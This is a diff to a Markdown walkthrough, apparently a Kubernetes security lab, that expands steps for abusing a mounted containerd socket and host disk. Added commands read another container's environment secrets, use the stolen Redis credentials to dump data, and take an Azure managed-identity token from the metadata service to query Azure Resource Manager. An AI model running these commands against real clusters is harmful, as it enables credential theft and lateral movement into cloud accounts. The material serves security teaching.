@@ -234,17 +234,27 @@ ctr --address /mnt/containerd.sock --namespace k8s.io container list
 
 </details>
 
-## Access secrets from another container
+## Access secrets and data from another container
 
 We will now try to retrieve secrets from a container that we do not have access to (via Kubernetes):
 
 ```bash
-id=$(ctr --address /mnt/containerd.sock --namespace k8s.io container list | grep "docker.io/whiteduck/sample-mvc:latest" | awk '{print $1}')
+id=$(ctr --address /mnt/containerd.sock --namespace k8s.io container list | grep "87a94228f133e2da99cb16d653cd1373c5b4e8689956386c1c12b60a20421a02" | awk '{print $1}')
 
 ctr --address /mnt/containerd.sock --namespace k8s.io container info $id | jq .Spec.process.env
 ```
 
-We could now use the database connection secret to access the database.
+
+With those secret we can now connect to the Redis instance and retrieve some data:
+
+```bash
+apt-get install -y redis-tools
+
+REDIS_HOST=$(ctr --address /mnt/containerd.sock --namespace k8s.io container info $id | jq -r .Spec.process.env[] | grep REDIS_HOST | sed 's/^.*=//')
+REDIS_KEY=$(ctr --address /mnt/containerd.sock --namespace k8s.io container info $id | jq -r .Spec.process.env[] | grep REDIS_KEY | sed 's/^.*REDIS_KEY=//')
+
+redis-cli -h $REDIS_HOST -a $REDIS_KEY get data
+```
 
 <details>
 <summary>Details on how to access the secrets</summary>
@@ -254,7 +264,7 @@ We will use the containerd CLI to access details of a container running on this 
 First we will retrieve the container ID:
 
 ```bash
-id=$(ctr --address /mnt/containerd.sock --namespace k8s.io container list | grep "docker.io/whiteduck/sample-mvc:latest" | awk '{print $1}')
+id=$(ctr --address /mnt/containerd.sock --namespace k8s.io container list | grep "87a94228f133e2da99cb16d653cd1373c5b4e8689956386c1c12b60a20421a02" | awk '{print $1}')
 ```
 
 And then request container runtime details such as environment variables:
@@ -262,7 +272,16 @@ And then request container runtime details such as environment variables:
 ctr --address /mnt/containerd.sock --namespace k8s.io container info $id | jq .Spec.process.env
 ```
 
-We could now use the database connection secret to access the database.
+With those secret we can now connect to the Redis instance and retrieve some data:
+
+```bash
+apt-get install -y redis-tools
+
+REDIS_HOST=$(ctr --address /mnt/containerd.sock --namespace k8s.io container info $id | jq -r .Spec.process.env[] | grep REDIS_HOST | sed 's/^.*=//')
+REDIS_KEY=$(ctr --address /mnt/containerd.sock --namespace k8s.io container info $id | jq -r .Spec.process.env[] | grep REDIS_KEY | sed 's/^.*REDIS_KEY=//')
+
+redis-cli -h $REDIS_HOST -a $REDIS_KEY get data
+```
 
 </details>
 
@@ -288,6 +307,11 @@ mount $(df | awk '{print $1}' | grep "/dev/sd") /tmp
 IDENTITY=$(cat /tmp/etc/kubernetes/azure.json | jq -r .userAssignedIdentityID)
 
 TOKEN=$(curl 'http://169.254.169.254/metadata/identity/oauth2/token?client_id='$IDENTITY'&api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s | jq -r .access_token)
+
+SUBSCRIPTION=$(cat /tmp/etc/kubernetes/azure.json | jq -r .subscriptionId)
+RG=$(cat /tmp/etc/kubernetes/azure.json | jq -r .resourceGroup)
+
+curl -X GET -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://management.azure.com/subscriptions/$SUBSCRIPTION/resourcegroups/$RG?api-version=2021-04-01 | jq
 ```
 
 We could now use the secret to talk to the cloud provider management plane (in our case Azure Resource Manager) and try to create or access further resources.
@@ -304,9 +328,16 @@ mount $(df | awk '{print $1}' | grep "/dev/sd") /tmp
 We can now retrieve the cloud identity used and request a valid token via the cloud metadata service (in our case Azure Instance Metadata Service):
 
 ```bash
+mount $(df | awk '{print $1}' | grep "/dev/sd") /tmp
+
 IDENTITY=$(cat /tmp/etc/kubernetes/azure.json | jq -r .userAssignedIdentityID)
 
 TOKEN=$(curl 'http://169.254.169.254/metadata/identity/oauth2/token?client_id='$IDENTITY'&api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s | jq -r .access_token)
+
+SUBSCRIPTION=$(cat /tmp/etc/kubernetes/azure.json | jq -r .subscriptionId)
+RG=$(cat /tmp/etc/kubernetes/azure.json | jq -r .resourceGroup)
+
+curl -X GET -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://management.azure.com/subscriptions/$SUBSCRIPTION/resourcegroups/$RG?api-version=2021-04-01 | jq
 ```
 
 We could now use the secret to talk to the cloud provider management plane (in our case Azure Resource Manager) and try to create or access further resources.
